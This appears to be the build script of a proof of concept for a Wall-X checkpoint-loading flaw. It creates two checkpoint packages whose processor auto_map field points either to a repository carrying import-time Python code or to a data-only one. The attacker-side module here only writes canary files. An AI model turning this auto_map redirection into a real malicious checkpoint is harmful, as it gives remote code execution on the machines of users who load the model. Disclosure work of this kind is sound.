"""Build every artifact used by the Wall-X reproduction.

Layout produced under poc/work/:

  ckpt_positive/                       the checkpoint package a user downloads
    config.yml                         (checkpoint-local config, names a tokenizer
                                        path from the training machine)
    preprocessor_config.json           (processor field -> SECOND repository)
    tokenizer_config.json
    tokenizer.json
  ckpt_negative/                       identical package, ONE field different:
    ...                                the processor field names a data-only
                                       repository instead of the attacker one
  hub/attacker/wallx-action-processor/ second repository, ships processing_*.py
  hub/trusted/action-tokenizer-data/   second repository, data files only

poc/SHA256SUMS.txt records the hash of every generated file.
"""
import hashlib
import json
import shutil
from pathlib import Path

HERE = Path(__file__).resolve().parent
WORK = HERE / "work"
ATTACKER_REPO = "attacker/wallx-action-processor"
TRUSTED_REPO = "trusted/action-tokenizer-data"

TINY_TOKENIZER = {
    "version": "1.0",
    "truncation": None,
    "padding": None,
    "added_tokens": [],
    "normalizer": None,
    "pre_tokenizer": {"type": "Whitespace"},
    "post_processor": None,
    "decoder": None,
    "model": {
        "type": "WordLevel",
        "vocab": {
            "<unk>": 0,
            "<pad>": 1,
            "<|action_token_0|>": 2,
            "<|action_token_1|>": 3,
            "<|action_token_2|>": 4,
            "<|action_token_3|>": 5,
            "hello": 6,
            "world": 7,
        },
        "unk_token": "<unk>",
    },
}

TOKENIZER_CONFIG = {
    "tokenizer_class": "PreTrainedTokenizerFast",
    "model_max_length": 2048,
    "unk_token": "<unk>",
    "pad_token": "<pad>",
}

# The checkpoint-local config a re-packaged checkpoint keeps from the machine it
# was trained on.  action_tokenizer_path does NOT exist on the victim's machine,
# which is exactly the situation Wall-X's "portable checkpoint" fallback handles.
CKPT_CONFIG_YML = """\
model_type: qwen2_5
processor_path: Qwen/Qwen2.5-VL-3B-Instruct
action_tokenizer_type: fast
action_tokenizer_path: /data/x2robot/checkpoints/tokenizers/fast-tokenizer-ar32
ar_dof_config:
  left_arm: 6
  left_gripper: 1
  right_arm: 6
  right_gripper: 1
"""

# The processor is only a set of files in the checkpoint package.  The single
# string that decides where the processor class comes from is this repository
# reference inside the processor field.
PROCESSOR_TEMPLATE = {
    "processor_class": "WallXActionProcessor",
    "auto_map": {
        "AutoProcessor": "{repo}--processing_wallx_action.WallXActionProcessor",
    },
    "action_horizon_ar": 32,
    "action_dim": 14,
}

SECOND_REPO_PROGRAM = '''\
"""Program carried by the second repository named in the checkpoint's processor
field.  Import time is execution time: the payload below runs while the module
is being loaded, before any Wall-X code can inspect the returned object."""
import os
from pathlib import Path

from transformers import ProcessorMixin

CANARY_DIR = Path(os.environ["WALLX_POC_CANARY_DIR"])
CANARY_DIR.mkdir(parents=True, exist_ok=True)


def _stamp(name, text):
    (CANARY_DIR / name).write_text(text, encoding="utf-8")
    print("[second-repo] wrote canary %s" % name)


print("[second-repo] processing_wallx_action.py is being imported on the victim host")
_stamp(
    "01_processing_module_imported.txt",
    "module-level code of processing_wallx_action.py executed during import\\n"
    "imported because the checkpoint's processor field named %s\\n"
    % os.environ.get("WALLX_POC_REPO", "?"),
)


class WallXActionProcessor(ProcessorMixin):
    """Stand-in for the remote processor class; reaching from_pretrained means
    transformers already resolved the class out of this repository."""

    attributes = ["tokenizer"]

    def __init__(self, **kwargs):
        self.tokenizer = None
        self.vocab_size = 8

    @classmethod
    def from_pretrained(cls, *args, **kwargs):
        _stamp(
            "02_processor_instantiated.txt",
            "AutoProcessor.from_pretrained() instantiated the class from the\\n"
            "second repository - the loader had already executed this module\\n",
        )
        print("[second-repo] WallXActionProcessor.from_pretrained() called")
        return cls()

    def __call__(self, *args, **kwargs):  # pragma: no cover - not reached
        return {"input_ids": []}
'''

TRUSTED_DATA_ONLY = {
    "config.json": json.dumps(
        {
            "action_tokenizer": "fast",
            "action_horizon_ar": 32,
            "note": "data-only repository: no processing/modeling Python here",
        },
        indent=2,
    )
    + "\n"
}


def write(path, text):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")
    return path


def json_file(path, obj):
    return write(path, json.dumps(obj, indent=2) + "\n")


def build_checkpoint(dst, repo):
    json_file(dst / "preprocessor_config.json", dict(PROCESSOR_TEMPLATE, auto_map={
        "AutoProcessor": "%s--processing_wallx_action.WallXActionProcessor" % repo,
    }))
    json_file(dst / "tokenizer_config.json", TOKENIZER_CONFIG)
    json_file(dst / "tokenizer.json", TINY_TOKENIZER)
    write(dst / "config.yml", CKPT_CONFIG_YML)


def main():
    shutil.rmtree(WORK, ignore_errors=True)
    WORK.mkdir(parents=True)

    build_checkpoint(WORK / "ckpt_positive", ATTACKER_REPO)
    build_checkpoint(WORK / "ckpt_negative", TRUSTED_REPO)

    write(WORK / "hub" / ATTACKER_REPO / "processing_wallx_action.py", SECOND_REPO_PROGRAM)
    json_file(WORK / "hub" / ATTACKER_REPO / "config.json", {
        "processor_class": "WallXActionProcessor",
        "action_horizon_ar": 32,
    })
    for name, text in TRUSTED_DATA_ONLY.items():
        write(WORK / "hub" / TRUSTED_REPO / name, text)

    files = sorted(p for p in WORK.rglob("*") if p.is_file())
    lines = []
    for path in files:
        digest = hashlib.sha256(path.read_bytes()).hexdigest()
        lines.append("%s  %s" % (digest, path.relative_to(HERE).as_posix()))
    write(HERE / "SHA256SUMS.txt", "\n".join(lines) + "\n")

    print("checkpoint package (positive) : %s" % (WORK / "ckpt_positive").relative_to(HERE))
    print("checkpoint package (negative) : %s" % (WORK / "ckpt_negative").relative_to(HERE))
    print("second repository (attacker)  : %s" % (WORK / "hub" / ATTACKER_REPO).relative_to(HERE))
    print("second repository (data only) : %s" % (WORK / "hub" / TRUSTED_REPO).relative_to(HERE))
    print()
    for case in ("ckpt_positive", "ckpt_negative"):
        cfg = json.loads((WORK / case / "preprocessor_config.json").read_text(encoding="utf-8"))
        print("%-14s processor field -> %s" % (case, cfg["auto_map"]["AutoProcessor"]))
    print()
    same = all(
        (WORK / "ckpt_positive" / rel).read_bytes() == (WORK / "ckpt_negative" / rel).read_bytes()
        for rel in ("config.yml", "tokenizer.json", "tokenizer_config.json")
    )
    print("%d files generated; both packages identical except that one string: %s"
          % (len(files), same))
    print("written: %s" % (HERE / "SHA256SUMS.txt").relative_to(HERE))


if __name__ == "__main__":
    main()
